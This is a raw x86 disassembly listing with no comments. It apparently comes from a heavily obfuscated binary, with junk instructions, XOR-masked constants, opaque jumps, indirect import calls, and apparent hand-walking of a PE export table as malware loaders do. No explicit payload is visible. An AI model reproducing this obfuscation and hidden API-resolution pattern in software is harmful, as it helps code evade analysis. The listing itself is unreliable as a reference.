  42073e:	mov    ecx,DWORD PTR [ebp-0x7c]
  420741:	and    DWORD PTR ds:0x42288e,0x4228ea
  42074b:	or     eax,ecx
  42074d:	mov    ecx,DWORD PTR [ebp+0x8]
  420750:	lea    eax,[ecx+eax*1+0x46210209]
  420757:	xor    DWORD PTR ds:0x42291a,0x563e
  420761:	push   eax
  420762:	sub    DWORD PTR ds:0x422926,0x42288e
  42076c:	call   0x41d122
  420771:	neg    ecx
  420773:	mov    ecx,eax
  420775:	mov    eax,DWORD PTR [ebp-0xc4]
  42077b:	sub    esi,0x184b
  420781:	imul   eax,eax,0x21b3
  420787:	and    esi,DWORD PTR ds:0x42297a
  42078d:	add    eax,DWORD PTR [ebp-0xe4]
  420793:	and    eax,0xd5c
  420798:	and    DWORD PTR ds:0x422952,0x302e
  4207a2:	sub    eax,0x2e81
  4207a7:	or     esi,DWORD PTR ds:0x4228ea
  4207ad:	xor    edx,edx
  4207af:	mov    esi,0x2f1dc
  4207b4:	or     DWORD PTR ds:0x422942,0x422976
  4207be:	div    esi
  4207c0:	xor    eax,0x56ef
  4207c5:	cmp    DWORD PTR ds:0x422946,0x0
  4207cc:	mov    DWORD PTR ds:0x422916,edi
  4207d2:	mov    DWORD PTR ds:0x422966,0x662c
  4207dc:	mov    DWORD PTR ds:0x4229d2,edi
  4207e2:	jmp    0x420902
  4207e7:	mov    DWORD PTR ds:0x4229ce,0x4f06
  4207f1:	jg     0x42080c
  4207f7:	push   DWORD PTR [ebp-0x20]
  4207fa:	call   DWORD PTR ds:0x42a1d8
  420800:	sub    esi,DWORD PTR ds:0x42288e
  420806:	sub    DWORD PTR ds:0x4229ba,edx
  42080c:	or     esi,esi
  42080e:	add    edx,0x7894
  420814:	mov    esi,DWORD PTR ds:0x4229f6
  42081a:	mov    edx,DWORD PTR ds:0x422a52
  420820:	sub    edx,esi
  420822:	imul   esi,DWORD PTR [esi+edx*1]
  420826:	xor    edx,DWORD PTR ds:0x422896
  42082c:	cmp    DWORD PTR ds:0x42295e,0x0
  420833:	mov    DWORD PTR ds:0x4228ea,0x1c26
  42083d:	mov    DWORD PTR ds:0x4229b2,edx
  420843:	jmp    0x420902
  420848:	mov    DWORD PTR ds:0x422962,0x1de8
  420852:	jb     0x420881
  420858:	push   DWORD PTR [ebp-0xc]
  42085b:	push   0x797e
  420860:	push   DWORD PTR [ebp-0x28]
  420863:	push   DWORD PTR [ebp-0x20]
  420866:	push   DWORD PTR [ebp-0x20]
  420869:	call   DWORD PTR ds:0x42a0a0
  42086f:	xor    edx,0x2ce5
  420875:	adc    DWORD PTR ds:0x422946,edi
  42087b:	sub    DWORD PTR ds:0x4229ca,edx
  420881:	xor    edx,esi
  420883:	and    esi,edx
  420885:	mov    edx,DWORD PTR ds:0x4229e2
  42088b:	mov    esi,DWORD PTR ds:0x422ab2
  420891:	sub    edx,esi
  420893:	xor    edx,DWORD PTR [edx+esi*1]
  420896:	cmp    DWORD PTR ds:0x42298a,0x0
  42089d:	mov    DWORD PTR ds:0x4228d6,edx
  4208a3:	movzx  edx,WORD PTR ds:0x422896
  4208aa:	mov    edx,0x6c32
  4208af:	jmp    0x420902
  4208b4:	mov    DWORD PTR ds:0x422896,0x27d5
  4208be:	mov    DWORD PTR ds:0x4228a2,0x76ec
  4208c8:	jb     0x4208f0
  4208ce:	push   DWORD PTR [ebp-0x28]
  4208d1:	push   DWORD PTR [ebp-0x28]
  4208d4:	call   DWORD PTR ds:0x42a0a4
  4208da:	adc    edx,0x3a8d
  4208e0:	and    DWORD PTR ds:0x422976,0x6cff
  4208ea:	or     DWORD PTR ds:0x422992,ebx
  4208f0:	xor    edx,DWORD PTR ds:0x42299a
  4208f6:	inc    DWORD PTR ds:0x4229ba
  4208fc:	and    DWORD PTR ds:0x422932,edx
  420902:	add    ecx,eax
  420904:	mov    DWORD PTR [ebp-0x90],ecx
  42090a:	mov    DWORD PTR [ebp-0xe0],0x7a31
  420914:	inc    esi
  420915:	mov    DWORD PTR [ebp-0x44],0x2514
  42091c:	xor    eax,eax
  42091e:	or     eax,DWORD PTR ds:0x4228ee
  420924:	xor    DWORD PTR ds:0x422932,eax
  42092a:	mov    DWORD PTR [ebp-0xdc],0x699c
  420934:	sbb    edx,ecx
  420936:	mov    DWORD PTR [ebp-0xd8],0x1
  420940:	mov    DWORD PTR [ebp-0x24],0x7901
  420947:	cmp    DWORD PTR ds:0x422976,0x0
  42094e:	not    edx
  420950:	mov    DWORD PTR ds:0x4228a2,0x569b
  42095a:	mov    DWORD PTR ds:0x4228a6,0x4d6f
  420964:	mov    DWORD PTR ds:0x42297e,edx
  42096a:	jmp    0x4209b9
  42096f:	mov    DWORD PTR ds:0x422976,edx
  420975:	mov    DWORD PTR ds:0x4228fa,ecx
  42097b:	je     0x42099d
  420981:	push   0x5aed
  420986:	push   0x6c8d
  42098b:	call   DWORD PTR ds:0x42a2f0
  420991:	xor    DWORD PTR ds:0x42293a,0x1a42
  42099b:	adc    esi,ecx
  42099d:	adc    edx,DWORD PTR ds:0x4228d6
  4209a3:	and    ecx,0x55be
  4209a9:	sbb    DWORD PTR ds:0x42290a,0x346b
  4209b3:	add    ecx,0x18f
  4209b9:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  4209c3:	mov    eax,ds:0x422ab6
  4209c8:	mov    eax,DWORD PTR [eax]
  4209ca:	sub    DWORD PTR ds:0x4228ce,eax
  4209d0:	mov    DWORD PTR [ebp-0x78],0x37f2
  4209d7:	or     DWORD PTR ds:0x4229b2,edx
  4209dd:	mov    DWORD PTR [ebp-0x10],0x62ba
  4209e4:	mov    DWORD PTR [ebp-0x94],0x561c
  4209ee:	adc    DWORD PTR ds:0x4228e6,0x1c9a
  4209f8:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ff:	xor    DWORD PTR ds:0x4228a2,edi
  420a05:	mov    DWORD PTR [ebp-0x60],0x24c7
  420a0c:	mov    DWORD PTR [ebp-0x5c],0x7a45
  420a13:	or     esi,ecx
  420a15:	mov    eax,DWORD PTR [ebp-0x34]
  420a18:	adc    esi,DWORD PTR ds:0x422936
  420a1e:	mov    ecx,DWORD PTR [ebp-0x60]
  420a21:	mov    edx,DWORD PTR ds:0x4228ea
  420a27:	add    DWORD PTR ds:0x42292e,edx
  420a2d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a30:	xor    DWORD PTR ds:0x4228b2,ecx
  420a36:	and    edx,0x160e
  420a3c:	neg    esi
  420a3e:	sub    edx,ecx
  420a40:	sub    edx,0x29ad
  420a46:	or     esi,ecx
  420a48:	imul   edx,eax
  420a4b:	cmp    DWORD PTR ds:0x42292e,0x0
  420a52:	mov    ecx,DWORD PTR ds:0x4229c6
  420a58:	mov    DWORD PTR ds:0x4229c6,0x2cb4
  420a62:	mov    esi,0x7aa2
  420a67:	jmp    0x420aa7
  420a6c:	mov    DWORD PTR ds:0x4228e2,edx
  420a72:	mov    eax,ds:0x422996
  420a77:	jb     0x420a9f
  420a7d:	push   DWORD PTR [ebp-0x10]
  420a80:	call   DWORD PTR ds:0x42a1dc
  420a86:	sbb    DWORD PTR ds:0x422986,edx
  420a8c:	xor    esi,esi
  420a8e:	add    esi,DWORD PTR ds:0x4229e6
  420a94:	mov    ecx,DWORD PTR ds:0x422a76
  420a9a:	sub    ecx,esi
  420a9c:	xor    esi,DWORD PTR [esi+ecx*1]
  420a9f:	and    ecx,esi
  420aa1:	dec    DWORD PTR ds:0x42289a
  420aa7:	mov    eax,DWORD PTR [ebp-0x90]
  420aad:	lea    eax,[eax+edx*1+0x14f2e240]
  420ab4:	sub    ecx,DWORD PTR ds:0x42296e
  420aba:	mov    DWORD PTR [ebp-0x174],eax
  420ac0:	mov    eax,DWORD PTR [ebp-0x24]
  420ac3:	and    DWORD PTR ds:0x422896,0x422952
  420acd:	mov    ecx,DWORD PTR [ebp-0x94]
  420ad3:	mov    edx,DWORD PTR [ebp-0x10]
  420ad6:	xor    edx,ecx
  420ad8:	cmp    DWORD PTR ds:0x4228be,0x0
  420adf:	not    esi
  420ae1:	mov    DWORD PTR ds:0x422946,0x4c6a
  420aeb:	jmp    0x420b4b
  420af0:	mov    DWORD PTR ds:0x42293e,0x2e5b
  420afa:	not    DWORD PTR ds:0x4229ae
  420b00:	jae    0x420b3b
  420b06:	push   DWORD PTR [ebp-0xc]
  420b09:	push   0x4ad9
  420b0e:	push   0x541c
  420b13:	push   0x4226c9
  420b18:	push   0x8f89
  420b1d:	call   DWORD PTR ds:0x42a2f4
  420b23:	sbb    esi,0x7b5f
  420b29:	or     DWORD PTR ds:0x4228f6,0x55a2
  420b33:	sbb    DWORD PTR ds:0x4228ee,ebx
  420b39:	neg    ecx
  420b3b:	xor    ecx,ecx
  420b3d:	add    esi,esi
  420b3f:	sub    esi,esi
  420b41:	or     DWORD PTR ds:0x42298e,0x3de5
  420b4b:	add    edx,DWORD PTR [ebp-0x78]
  420b4e:	adc    ecx,DWORD PTR ds:0x4228de
  420b54:	mov    ecx,DWORD PTR [ebp-0xc0]
  420b5a:	lea    ecx,[edx+ecx*1+0x6ac1]
  420b61:	and    ecx,eax
  420b63:	mov    eax,0x1101
  420b68:	cmp    DWORD PTR ds:0x42294e,0x0
  420b6f:	mov    DWORD PTR ds:0x4228fe,0x36ab
  420b79:	mov    esi,DWORD PTR ds:0x4228b6
  420b7f:	mov    edx,0x20e8
  420b84:	jmp    0x420bd6
  420b89:	mov    esi,DWORD PTR ds:0x42299a
  420b8f:	ja     0x420bc3
  420b95:	push   0x4228a2
  420b9a:	push   0x42299a
  420b9f:	push   0x42293a
  420ba4:	call   DWORD PTR ds:0x42a0a8
  420baa:	adc    edx,0x5974
  420bb0:	movzx  esi,BYTE PTR ds:0x422952
  420bb7:	xor    DWORD PTR ds:0x4228ce,esi
  420bbd:	or     DWORD PTR ds:0x422926,ecx
  420bc3:	or     edx,DWORD PTR ds:0x4228ce
  420bc9:	movzx  edx,WORD PTR ds:0x4229b6
  420bd0:	sub    DWORD PTR ds:0x42299e,edx
  420bd6:	sub    eax,ecx
  420bd8:	add    eax,DWORD PTR [ebp+0x8]
  420bdb:	mov    DWORD PTR [ebp-0x170],eax
  420be1:	cmp    DWORD PTR ds:0x422952,0x0
  420be8:	mov    DWORD PTR ds:0x42289a,0x4ae9
  420bf2:	mov    DWORD PTR ds:0x422896,0x6df4
  420bfc:	mov    DWORD PTR ds:0x422902,0x1097
  420c06:	mov    esi,0x562b
  420c0b:	jmp    0x420c65
  420c10:	not    eax
  420c12:	mov    DWORD PTR ds:0x422896,ebx
  420c18:	jae    0x420c55
  420c1e:	push   0x61a8
  420c23:	push   0x28f0
  420c28:	push   0x2a61
  420c2d:	push   0x1d7f
  420c32:	push   DWORD PTR [ebp-0xc]
  420c35:	push   DWORD PTR [ebp-0x24]
  420c38:	push   0x73d0
  420c3d:	call   DWORD PTR ds:0x42a1e0
  420c43:	adc    edx,0x4a39
  420c49:	xor    edx,esi
  420c4b:	or     DWORD PTR ds:0x422946,0x6558
  420c55:	sub    esi,0x4c5d
  420c5b:	xor    DWORD PTR ds:0x4228d2,0x124
  420c65:	mov    DWORD PTR [ebp-0x15c],0xba699573
  420c6f:	mov    DWORD PTR [ebp-0x158],0x9c0a89d8
  420c79:	mov    DWORD PTR [ebp-0x154],0xba699577
  420c83:	sbb    DWORD PTR ds:0x422956,edi
  420c89:	mov    DWORD PTR [ebp-0x150],0x9c0a89d8
  420c93:	or     esi,0x7211
  420c99:	mov    esi,DWORD PTR [ebp-0x174]
  420c9f:	mov    eax,DWORD PTR [ebp-0x154]
  420ca5:	mov    edx,DWORD PTR [ebp-0x150]
  420cab:	sbb    DWORD PTR ds:0x42292e,0x5043
  420cb5:	xor    eax,0xba699573
  420cba:	sub    DWORD PTR ds:0x4228fa,0x6217
  420cc4:	xor    edx,0x9c0a89d8
  420cca:	mov    cl,0x2
  420ccc:	call   0x41a184
  420cd1:	cmp    DWORD PTR ds:0x4229aa,0x0
  420cd8:	mov    DWORD PTR ds:0x422936,0x7dfa
  420ce2:	mov    ebx,DWORD PTR ds:0x422896
  420ce8:	not    ebx
  420cea:	mov    ebx,0x627c
  420cef:	jmp    0x420d43
  420cf4:	mov    DWORD PTR ds:0x422892,0x500b
  420cfe:	mov    DWORD PTR ds:0x4229a6,0x12a3
  420d08:	jle    0x420d34
  420d0e:	push   DWORD PTR [ebp-0xc]
  420d11:	push   0x7ce6
  420d16:	push   DWORD PTR [ebp-0x28]
  420d19:	call   DWORD PTR ds:0x42a2f8
  420d1f:	add    ebx,0x3114
  420d25:	movzx  ebx,BYTE PTR ds:0x4229ae
  420d2c:	add    DWORD PTR ds:0x422922,ebx
  420d32:	and    ebx,ebx
  420d34:	inc    ebx
  420d35:	neg    ebx
  420d37:	xor    edi,DWORD PTR ds:0x422962
  420d3d:	xor    ebx,DWORD PTR ds:0x4228ba
  420d43:	mov    edi,eax
  420d45:	mov    ebx,edx
  420d47:	and    edx,DWORD PTR ds:0x422902
  420d4d:	mov    eax,DWORD PTR [ebp-0x154]
  420d53:	mov    edx,DWORD PTR [ebp-0x150]
  420d59:	xor    eax,0xba699573
  420d5e:	xor    edx,0x9c0a89d8
  420d64:	mov    cl,0x3e
  420d66:	adc    DWORD PTR ds:0x4228ea,0x4228ee
  420d70:	call   0x421c3d
  420d75:	or     edi,eax
  420d77:	or     ebx,edx
  420d79:	cmp    DWORD PTR ds:0x422912,0x0
  420d80:	mov    DWORD PTR ds:0x422992,ecx
  420d86:	mov    DWORD PTR ds:0x4228d2,edi
  420d8c:	not    edx
  420d8e:	mov    edx,0x3bde
  420d93:	jmp    0x420de4
  420d98:	not    eax
  420d9a:	mov    eax,ds:0x422922
  420d9f:	jne    0x420dd2
  420da5:	push   0x10a6
  420daa:	call   DWORD PTR ds:0x42a0ac
  420db0:	xor    DWORD PTR ds:0x4228ea,0x6213
  420dba:	mov    edx,DWORD PTR ds:0x422ad6
  420dc0:	mov    edx,DWORD PTR [edx]
  420dc2:	sub    DWORD PTR ds:0x4228ea,edx
  420dc8:	adc    DWORD PTR ds:0x42297e,0x796e
  420dd2:	sub    DWORD PTR ds:0x42291e,ebx
  420dd8:	sbb    edx,0x242b
  420dde:	sbb    edx,DWORD PTR ds:0x42291a
  420de4:	mov    eax,DWORD PTR [ebp-0x15c]
  420dea:	neg    edx
  420dec:	mov    edx,DWORD PTR [ebp-0x158]
  420df2:	sub    DWORD PTR ds:0x4228b6,0x5dbf
  420dfc:	xor    eax,0xba699573
  420e01:	sbb    DWORD PTR ds:0x422942,0x2b75
  420e0b:	xor    edx,0x9c0a89d8
  420e11:	mov    cl,0x2
  420e13:	adc    DWORD PTR ds:0x422966,0x1945
  420e1d:	call   0x41a184
  420e22:	mov    ecx,edx
  420e24:	mov    edx,DWORD PTR [ebp-0x15c]
  420e2a:	mov    DWORD PTR [ebp-0x218],esi
  420e30:	mov    esi,DWORD PTR [ebp-0x158]
  420e36:	xor    edx,0xba699573
  420e3c:	xor    esi,0x9c0a89d8
  420e42:	mov    DWORD PTR [ebp-0x21c],eax
  420e48:	mov    eax,edx
  420e4a:	mov    edx,esi
  420e4c:	mov    DWORD PTR [ebp-0x220],ecx
  420e52:	mov    cl,0x3e
  420e54:	call   0x421c3d
  420e59:	mov    esi,DWORD PTR [ebp-0x21c]
  420e5f:	or     esi,eax
  420e61:	mov    eax,DWORD PTR [ebp-0x220]
  420e67:	or     eax,edx
  420e69:	push   eax
  420e6a:	push   esi
  420e6b:	push   ebx
  420e6c:	push   edi
  420e6d:	call   0x41dfb1
  420e72:	mov    esi,DWORD PTR [ebp-0x218]
  420e78:	cmp    esi,eax
  420e7a:	jne    0x420f30
  420e80:	mov    eax,DWORD PTR [ebp-0x154]
  420e86:	mov    edx,DWORD PTR [ebp-0x150]
  420e8c:	xor    eax,0xba699573
  420e91:	xor    edx,0x9c0a89d8
  420e97:	mov    cl,0x2
  420e99:	call   0x41a184
  420e9e:	mov    esi,eax
  420ea0:	mov    edi,edx
  420ea2:	mov    eax,DWORD PTR [ebp-0x154]
  420ea8:	mov    edx,DWORD PTR [ebp-0x150]
  420eae:	xor    eax,0xba699573
  420eb3:	xor    edx,0x9c0a89d8
  420eb9:	mov    cl,0x3e
  420ebb:	call   0x421c3d
  420ec0:	or     esi,eax
  420ec2:	or     edi,edx
  420ec4:	mov    eax,DWORD PTR [ebp-0x15c]
  420eca:	mov    edx,DWORD PTR [ebp-0x158]
  420ed0:	xor    eax,0xba699573
  420ed5:	xor    edx,0x9c0a89d8
  420edb:	mov    cl,0x2
  420edd:	call   0x41a184
  420ee2:	mov    ebx,eax
  420ee4:	mov    eax,edx
  420ee6:	mov    ecx,DWORD PTR [ebp-0x15c]
  420eec:	mov    edx,DWORD PTR [ebp-0x158]
  420ef2:	xor    ecx,0xba699573
  420ef8:	xor    edx,0x9c0a89d8
  420efe:	mov    DWORD PTR [ebp-0x224],eax
  420f04:	mov    eax,ecx
  420f06:	mov    cl,0x3e
  420f08:	call   0x421c3d
  420f0d:	or     ebx,eax
  420f0f:	mov    eax,DWORD PTR [ebp-0x224]
  420f15:	or     eax,edx
  420f17:	push   eax
  420f18:	push   ebx
  420f19:	push   edi
  420f1a:	push   esi
  420f1b:	call   0x41dfb1
  420f20:	mov    DWORD PTR [ebp-0x178],eax
  420f26:	jmp    0x4211f0
  420f2b:	jmp    0x4211a6
  420f30:	lea    eax,[ebp-0x168]
  420f36:	mov    DWORD PTR [ebp-0x164],eax
  420f3c:	mov    eax,DWORD PTR [ebp-0x164]
  420f42:	mov    DWORD PTR [eax],0xa3e69a9d
  420f48:	mov    eax,DWORD PTR [ebp-0x168]
  420f4e:	xor    eax,0xa3e69a9d
  420f53:	shr    eax,0x2
  420f56:	mov    ecx,DWORD PTR [ebp-0x168]
  420f5c:	xor    ecx,0xa3e69a9d
  420f62:	shl    ecx,0x1e
  420f65:	or     eax,ecx
  420f67:	mov    ecx,DWORD PTR [ebp-0x174]
  420f6d:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  420f71:	mov    DWORD PTR [ebp-0x160],eax
  420f77:	mov    esi,DWORD PTR [ebp-0x160]
  420f7d:	mov    eax,DWORD PTR [ebp-0x154]
  420f83:	mov    edx,DWORD PTR [ebp-0x150]
  420f89:	xor    eax,0xba699573
  420f8e:	xor    edx,0x9c0a89d8
  420f94:	mov    cl,0x2
  420f96:	call   0x41a184
  420f9b:	mov    edi,eax
  420f9d:	mov    ebx,edx
  420f9f:	mov    eax,DWORD PTR [ebp-0x154]
  420fa5:	mov    edx,DWORD PTR [ebp-0x150]
  420fab:	xor    eax,0xba699573
  420fb0:	xor    edx,0x9c0a89d8
  420fb6:	mov    cl,0x3e
  420fb8:	call   0x421c3d
  420fbd:	or     edi,eax
  420fbf:	or     ebx,edx
  420fc1:	mov    eax,DWORD PTR [ebp-0x15c]
  420fc7:	mov    edx,DWORD PTR [ebp-0x158]
  420fcd:	xor    eax,0xba699573
  420fd2:	xor    edx,0x9c0a89d8
  420fd8:	mov    cl,0x2
  420fda:	call   0x41a184
  420fdf:	mov    ecx,edx
  420fe1:	mov    edx,DWORD PTR [ebp-0x15c]
  420fe7:	mov    DWORD PTR [ebp-0x228],esi
  420fed:	mov    esi,DWORD PTR [ebp-0x158]
  420ff3:	xor    edx,0xba699573
  420ff9:	xor    esi,0x9c0a89d8
  420fff:	mov    DWORD PTR [ebp-0x22c],eax
  421005:	mov    eax,edx
  421007:	mov    edx,esi
  421009:	mov    DWORD PTR [ebp-0x230],ecx
  42100f:	mov    cl,0x3e
  421011:	call   0x421c3d
  421016:	mov    esi,DWORD PTR [ebp-0x22c]
  42101c:	or     esi,eax
  42101e:	mov    eax,DWORD PTR [ebp-0x230]
  421024:	or     eax,edx
  421026:	push   eax
  421027:	push   esi
  421028:	push   ebx
  421029:	push   edi
  42102a:	call   0x41dfb1
  42102f:	mov    esi,DWORD PTR [ebp-0x228]
  421035:	cmp    esi,eax
  421037:	je     0x4210ac
  42103d:	mov    eax,DWORD PTR [ebp-0x154]
  421043:	mov    edx,DWORD PTR [ebp-0x150]
  421049:	xor    eax,0xba699573
  42104e:	xor    edx,0x9c0a89d8
  421054:	mov    cl,0x2
  421056:	call   0x41a184
  42105b:	mov    esi,eax
  42105d:	mov    edi,edx
  42105f:	mov    eax,DWORD PTR [ebp-0x154]
  421065:	mov    edx,DWORD PTR [ebp-0x150]
  42106b:	xor    eax,0xba699573
  421070:	xor    edx,0x9c0a89d8
  421076:	mov    cl,0x3e
  421078:	call   0x421c3d
  42107d:	or     esi,eax
  42107f:	or     edi,edx
  421081:	mov    eax,DWORD PTR [ebp-0x160]
  421087:	imul   esi,eax
  42108a:	add    esi,DWORD PTR [ebp-0x170]
  421090:	mov    DWORD PTR [ebp-0x16c],esi
  421096:	mov    eax,DWORD PTR [ebp-0x16c]
  42109c:	mov    DWORD PTR [ebp-0x178],eax
  4210a2:	jmp    0x4211f0
  4210a7:	jmp    0x421157
  4210ac:	mov    eax,DWORD PTR [ebp-0x154]
  4210b2:	mov    edx,DWORD PTR [ebp-0x150]
  4210b8:	xor    eax,0xba699573
  4210bd:	xor    edx,0x9c0a89d8
  4210c3:	mov    cl,0x2
  4210c5:	call   0x41a184
  4210ca:	mov    esi,eax
  4210cc:	mov    edi,edx
  4210ce:	mov    eax,DWORD PTR [ebp-0x154]
  4210d4:	mov    edx,DWORD PTR [ebp-0x150]
  4210da:	xor    eax,0xba699573
  4210df:	xor    edx,0x9c0a89d8
  4210e5:	mov    cl,0x3e
  4210e7:	call   0x421c3d
  4210ec:	or     esi,eax
  4210ee:	or     edi,edx
  4210f0:	mov    eax,DWORD PTR [ebp-0x15c]
  4210f6:	mov    edx,DWORD PTR [ebp-0x158]
  4210fc:	xor    eax,0xba699573
  421101:	xor    edx,0x9c0a89d8
  421107:	mov    cl,0x2
  421109:	call   0x41a184
  42110e:	mov    ebx,eax
  421110:	mov    eax,edx
  421112:	mov    ecx,DWORD PTR [ebp-0x15c]
  421118:	mov    edx,DWORD PTR [ebp-0x158]
  42111e:	xor    ecx,0xba699573
  421124:	xor    edx,0x9c0a89d8
  42112a:	mov    DWORD PTR [ebp-0x234],eax
  421130:	mov    eax,ecx
  421132:	mov    cl,0x3e
  421134:	call   0x421c3d
  421139:	or     ebx,eax
  42113b:	mov    eax,DWORD PTR [ebp-0x234]
  421141:	or     eax,edx
  421143:	push   eax
  421144:	push   ebx
  421145:	push   edi
  421146:	push   esi
  421147:	call   0x41dfb1
  42114c:	mov    DWORD PTR [ebp-0x178],eax
  421152:	jmp    0x4211f0
  421157:	mov    eax,DWORD PTR [ebp-0x15c]
  42115d:	mov    edx,DWORD PTR [ebp-0x158]
  421163:	xor    eax,0xba699573
  421168:	xor    edx,0x9c0a89d8
  42116e:	mov    cl,0x2
  421170:	call   0x41a184
  421175:	mov    esi,eax
  421177:	mov    edi,edx
  421179:	mov    eax,DWORD PTR [ebp-0x15c]
  42117f:	mov    edx,DWORD PTR [ebp-0x158]
  421185:	xor    eax,0xba699573
  42118a:	xor    edx,0x9c0a89d8
  421190:	mov    cl,0x3e
  421192:	call   0x421c3d
  421197:	or     esi,eax
  421199:	or     edi,edx
  42119b:	mov    DWORD PTR [ebp-0x178],esi
  4211a1:	jmp    0x4211f0
  4211a6:	mov    eax,DWORD PTR [ebp-0x15c]
  4211ac:	mov    edx,DWORD PTR [ebp-0x158]
  4211b2:	xor    eax,0xba699573
  4211b7:	xor    edx,0x9c0a89d8
  4211bd:	mov    cl,0x2
  4211bf:	call   0x41a184
  4211c4:	mov    esi,eax
  4211c6:	mov    edi,edx
  4211c8:	mov    eax,DWORD PTR [ebp-0x15c]
  4211ce:	mov    edx,DWORD PTR [ebp-0x158]
  4211d4:	xor    eax,0xba699573
  4211d9:	xor    edx,0x9c0a89d8
  4211df:	mov    cl,0x3e
  4211e1:	call   0x421c3d
  4211e6:	or     esi,eax
  4211e8:	or     edi,edx
  4211ea:	mov    DWORD PTR [ebp-0x178],esi
  4211f0:	mov    ecx,DWORD PTR [ebp-0xd8]
  4211f6:	mov    eax,0x459a
  4211fb:	xor    edx,edx
  4211fd:	div    ecx
  4211ff:	mov    ecx,DWORD PTR [ebp-0xdc]
  421205:	and    eax,ecx
  421207:	add    eax,DWORD PTR [ebp-0x44]
  42120a:	mov    ecx,DWORD PTR [ebp-0xe0]
  421210:	lea    eax,[eax+ecx*1+0x272f]
  421217:	xor    eax,0x1080c
  42121c:	add    eax,DWORD PTR [ebp-0x178]
  421222:	mov    DWORD PTR [ebp-0xe8],eax
  421228:	mov    DWORD PTR [ebp-0xc],0x5950
  42122f:	mov    DWORD PTR [ebp-0xf8],0x4964
  421239:	mov    DWORD PTR [ebp-0x130],0x3
  421243:	mov    DWORD PTR [ebp-0x20],0x2df9
  42124a:	mov    DWORD PTR [ebp-0x8],0x4524
  421251:	mov    DWORD PTR [ebp-0xd4],0x637e
  42125b:	mov    DWORD PTR [ebp-0x110],0x38c8
  421265:	mov    DWORD PTR [ebp-0xa4],0x7118
  42126f:	mov    DWORD PTR [ebp-0xa0],0xaf6
  421279:	mov    DWORD PTR [ebp-0x10c],0x3315
  421283:	mov    eax,DWORD PTR [ebp-0xf8]
  421289:	mov    ecx,DWORD PTR [ebp-0x130]
  42128f:	xor    edx,edx
  421291:	div    ecx
  421293:	add    eax,0x454e
  421298:	mov    ecx,DWORD PTR [ebp-0xc]
  42129b:	and    eax,ecx
  42129d:	xor    eax,0x5940
  4212a2:	add    eax,DWORD PTR [ebp+0x8]
  4212a5:	mov    ecx,DWORD PTR [ebp-0x110]
  4212ab:	mov    edx,DWORD PTR [ebp-0xa4]
  4212b1:	sub    ecx,edx
  4212b3:	mov    edx,DWORD PTR [ebp-0xd4]
  4212b9:	or     ecx,edx
  4212bb:	mov    edx,DWORD PTR [ebp-0x8]
  4212be:	and    ecx,edx
  4212c0:	mov    edx,DWORD PTR [ebp-0x20]
  4212c3:	xor    ecx,edx
  4212c5:	mov    edx,DWORD PTR [ebp-0x10c]
  4212cb:	mov    esi,0x180f
  4212d0:	sub    esi,edx
  4212d2:	mov    edx,DWORD PTR [ebp-0xa0]
  4212d8:	imul   esi,edx
  4212db:	xor    esi,0x402b
  4212e1:	xor    esi,0xfed78c17
  4212e7:	mov    edx,DWORD PTR [ebp-0xe8]
  4212ed:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4212f4:	add    ecx,eax
  4212f6:	add    esi,ecx
  4212f8:	mov    DWORD PTR [ebp-0x38],esi
  4212fb:	mov    DWORD PTR [ebp-0x4],0x59a8
  421302:	mov    DWORD PTR [ebp-0x30],0x7021
  421309:	mov    DWORD PTR [ebp-0xf4],0x6210
  421313:	mov    DWORD PTR [ebp-0x58],0x73d5
  42131a:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421324:	mov    DWORD PTR [ebp-0x3c],0x3144
  42132b:	mov    eax,DWORD PTR [ebp-0x30]
  42132e:	xor    eax,0x75cb
  421333:	mov    ecx,DWORD PTR [ebp-0x4]
  421336:	imul   eax,ecx
  421339:	mov    ecx,DWORD PTR [ebp+0x8]
  42133c:	lea    ecx,[ecx+eax*1-0x2123b90]
  421343:	mov    eax,DWORD PTR [ebp-0xf4]
  421349:	and    eax,0x6b34
  42134e:	and    eax,0x658d
  421353:	xor    edx,edx
  421355:	push   0x6
  421357:	pop    esi
  421358:	div    esi
  42135a:	imul   eax,eax,0x3fb9
  421360:	mov    edx,DWORD PTR [ebp-0x3c]
  421363:	and    edx,0x58c7
  421369:	mov    esi,DWORD PTR [ebp-0x124]
  42136f:	or     edx,esi
  421371:	add    edx,0x7a25
  421377:	imul   edx,edx,0x28d2
  42137d:	mov    esi,DWORD PTR [ebp-0x58]
  421380:	xor    edx,esi
  421382:	xor    edx,0x1856f731
  421388:	mov    esi,DWORD PTR [ebp-0xe8]
  42138e:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421395:	add    eax,ecx
  421397:	add    edx,eax
  421399:	mov    DWORD PTR [ebp-0xac],edx
  42139f:	mov    DWORD PTR [ebp-0x54],0x1
  4213a6:	mov    DWORD PTR [ebp-0x40],0x1ee8
  4213ad:	mov    DWORD PTR [ebp-0x1c],0x64d8
  4213b4:	mov    DWORD PTR [ebp-0xf0],0x5a06
  4213be:	mov    DWORD PTR [ebp-0x108],0x2eeb
  4213c8:	mov    DWORD PTR [ebp-0x104],0x2108
  4213d2:	mov    eax,DWORD PTR [ebp-0x1c]
  4213d5:	xor    edx,edx
  4213d7:	push   0x3
  4213d9:	pop    ecx
  4213da:	div    ecx
  4213dc:	mov    ecx,DWORD PTR [ebp-0x40]
  4213df:	or     eax,ecx
  4213e1:	mov    ecx,DWORD PTR [ebp-0x54]
  4213e4:	xor    edx,edx
  4213e6:	div    ecx
  4213e8:	imul   eax,eax,0x7d53
  4213ee:	mov    ecx,DWORD PTR [ebp+0x8]
  4213f1:	lea    eax,[ecx+eax*1-0x1f534807]
  4213f8:	mov    ecx,DWORD PTR [ebp-0xf0]
  4213fe:	and    ecx,0x4108
  421404:	and    ecx,0x40e7
  42140a:	sub    ecx,0x1a54
  421410:	xor    ecx,0x25ac
  421416:	mov    edx,DWORD PTR [ebp-0x104]
  42141c:	xor    edx,0x6dda
  421422:	mov    esi,DWORD PTR [ebp-0x108]
  421428:	and    edx,esi
  42142a:	and    edx,0xe0c
  421430:	or     edx,0x5b
  421433:	mov    esi,DWORD PTR [ebp-0xe8]
  421439:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42143d:	add    ecx,eax
  42143f:	lea    eax,[edx+ecx*1-0xc5b]
  421446:	mov    DWORD PTR [ebp-0xa8],eax
  42144c:	and    DWORD PTR [ebp-0x144],0x0
